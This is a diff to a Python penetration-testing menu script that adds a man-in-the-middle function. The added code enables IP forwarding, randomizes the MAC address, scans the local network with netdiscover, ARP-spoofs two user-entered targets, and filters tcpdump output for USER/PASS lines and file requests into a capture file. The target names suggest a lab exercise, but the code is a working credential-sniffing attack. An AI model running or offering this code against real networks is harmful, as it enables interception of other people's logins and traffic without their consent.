@@ -250,6 +250,88 @@ def worker(queue, domain, output_file, results_lock, progress):
                 if progress['count'] % 100 == 0:  # Print progress every 100 subdomains
                     print(f"Processed {progress['count']} subdomains...")
             queue.task_done()
+
+def get_interface_and_network():
+    """
+    Identify the network interface and calculate the network range.
+    """
+    try:
+        # Get the network interface starting with "tap"
+        interface = subprocess.check_output(
+            "ip -br a | grep tap | head -n 1 | cut -d ' ' -f1", shell=True, text=True
+        ).strip()
+
+        if not interface:
+            raise ValueError("No network interface starting with 'tap' found.")
+
+        # Get the network range
+        network = subprocess.check_output(
+            f"ipcalc $(ip -br a | grep tap | head -n 1 | awk '{{print $3}}' | awk -F '/' '{{print $1}}') "
+            f"| grep -F 'Network:' | awk '{{print $2}}'",
+            shell=True,
+            text=True
+        ).strip()
+
+        if not network:
+            raise ValueError("Unable to calculate the network range.")
+
+        return interface, network
+    except subprocess.CalledProcessError as e:
+        print(f"Error determining network interface or range: {e}")
+        exit(1)
+
+def enable_packet_routing():
+    """
+    Enable packet forwarding in the system.
+    """
+    try:
+        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+            f.write("1")
+        print("Packet routing enabled.")
+    except Exception as e:
+        print(f"Failed to enable packet routing: {e}")
+        exit(1)
+
+def setup_mitm_environment(interface, network):
+    """
+    Set up the Man-in-the-Middle attack environment.
+    """
+    try:
+        # Change the MAC address for the interface
+        subprocess.run(f"macchanger -r {interface}", shell=True, check=True)
+        print("MAC address changed.")
+
+        # Run Netdiscover in a new terminal
+        print("Launching Netdiscover...")
+        subprocess.Popen(
+            f"tilix --action=app-new-window --command='netdiscover -i {interface} -r {network}'",
+            shell=True
+        )
+        time.sleep(10)
+
+        # Ask the user for target IPs
+        target1 = input("Enter the IP of target 1 (ALV01): ").strip()
+        target2 = input("Enter the IP of target 2 (ALV02): ").strip()
+
+        # Launch ARP spoofing in a new terminal
+        print("Starting ARP spoofing...")
+        subprocess.Popen(
+            f"tilix --action=app-new-session --command='arpspoof -i {interface} -t {target1} -r {target2}'",
+            shell=True
+        )
+
+        # Start capturing traffic with Tcpdump
+        print("Starting packet capture with Tcpdump...")
+        tcpdump_command = (
+            f"tcpdump -i {interface} host {target1} and host {target2} | "
+            f"grep -E '\\[P.\\]' | grep -E 'PASS|USER|html|GET|pdf|jpeg|jpg|png|txt' | tee capturas.txt"
+        )
+        subprocess.run(tcpdump_command, shell=True)
+
+    except subprocess.CalledProcessError as e:
+        print(f"Error setting up MITM environment: {e}")
+        exit(1)
+
 # Check if the required modules are installed
 """
 #def check_requirements(skip_selenium=False):
@@ -439,7 +521,7 @@ def main():
         elif choice == "9":  # OSINT Tool
             ix_general_google_query()
             
-        elif choice == "10":  # Reserved for future functionality
+        elif choice == "10":  # MiTM
             print("[WARNING] This function is not implemented yet")
             pause()
             
